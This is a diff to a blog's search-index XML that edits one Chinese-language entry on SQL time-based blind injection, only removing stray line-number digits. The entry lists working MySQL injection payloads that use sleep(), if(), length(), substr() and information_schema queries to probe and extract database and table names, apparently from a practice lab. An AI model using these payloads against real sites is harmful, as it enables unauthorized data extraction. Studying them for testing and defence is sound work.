@@ -3,7 +3,7 @@
   <entry>
     <title><![CDATA[sql时间盲注]]></title>
     <url>%2F2018%2F10%2F25%2Fsql%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%2F</url>
-    <content type="text"><![CDATA[sql基于时间的盲注知识点1.时间检测盲注使用的函数 检测是否有时间盲注： and select sleep(5) --+ 2.检测数据库名and if(length(database())&gt;=8,sleep(5),1) --+ and (select if(ascii(substr(database(),1,1)),sleep(5),null)) --+ 3.检测表名检测表名长度 123and if(length((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1)&gt;5),sleep(5),1)--+ 检测表名 12and if(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1)=&apos;a&apos;,sleep(5),1)--+]]></content>
+    <content type="text"><![CDATA[sql基于时间的盲注知识点1.时间检测盲注使用的函数 检测是否有时间盲注： and select sleep(5) --+ 2.检测数据库名and if(length(database())&gt;=8,sleep(5),1) --+ and (select if(ascii(substr(database(),1,1)),sleep(5),null)) --+ 3.检测表名检测表名长度 1and if(length((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1)&gt;5),sleep(5),1)--+ 检测表名 1and if(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1)=&apos;a&apos;,sleep(5),1)--+]]></content>
       <categories>
         <category>sql注入</category>
       </categories>
